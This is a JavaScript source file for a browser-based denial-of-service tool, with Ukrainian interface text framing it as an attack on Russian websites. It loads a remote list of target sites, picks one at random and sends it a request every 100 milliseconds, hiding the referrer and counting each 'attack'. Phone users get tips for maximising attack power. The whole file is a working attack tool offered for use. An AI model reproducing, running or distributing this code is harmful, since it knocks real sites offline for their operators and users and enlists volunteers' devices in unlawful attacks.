// Worker
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'

const fetchMode = {
	mode: 'no-cors',
	referrerPolicy: 'no-referrer'
}

add_count = () => document.getElementById("attacks").textContent++

/*
function catchErr(e) {
	alert(`Помилка!\nПеревірте підключення до інтернету\nТекст помилки: ${e}`);
	console.error("No internet connection");
	Doser.stop();
}
*/

randint = (to) => Math.floor(Math.random() * to)

async function getTarget() {
    targets = await fetch(targetSource);
    data = await targets.json();

    targets = [];
    for (var i = 0; i < data.length; i++) {
        if (data[i].method == 'post' || data[i].method == 'get') {
            targets.push(data[i])
        }
    };

    return targets[randint(targets.length)]
}


class doser {
    attack = false; // Status of attack
    interval;

    async start() {
    	this.attack = true;

        // Startup interval of DDoS attack

        btn.textContent = "Стоп";
        let target = await getTarget()
        console.log(target)

        let targ = document.getElementById("target");
        let method = document.getElementById("method");
        targ.textContent = target.page;
        method.textContent = target.method.toUpperCase();

        this.interval = setInterval(async function () {
            // Requests

            try {
	            await fetch([target.page], {
	            	method: target.method,
	            	...fetchMode
	            }).then(() => {
	                // After requests

	                console.log("Ok!");
	                add_count();
	            })
        	} catch (e) {this.stop()}
        }, 100);
    };
    stop() {
    	this.attack = false;
    	clearInterval(this.interval);
    	btn.textContent = "Старт!";
    }; // Kill interval
}


// navigator.userAgentData.platform == "Android"
if ("Android") {
	const guide = [
		"Для найефективнішої атаки на російські сайти з телефону, радимо:",
		"1. Зняти чохол, щоб телефон сильно не нагрівався",
		"2. За можливості поставити на зарядку",
		"3. Закрити всі попередньо відкриті програми (для збільшення потужності)",
		"4. Вимкнути режим енергозбереження",
		"5. Розташувати телефон в місці найкращої якості інтернету"
	];

	for (var i = 0; i < guide.length; i++) {
		let div = document.createElement('div');
		div.classList = "item";
		let text = document.createElement('p');
		text.textContent = guide[i];

		div.appendChild(text);
		document.getElementById("guide").appendChild(div)
	};
}


let btn = document.getElementById("button")
const Doser = new doser

btn.addEventListener('click', (e) => {
    e.preventDefault();

    !Doser.attack ? Doser.start() : Doser.stop();
})

// Слава Україні!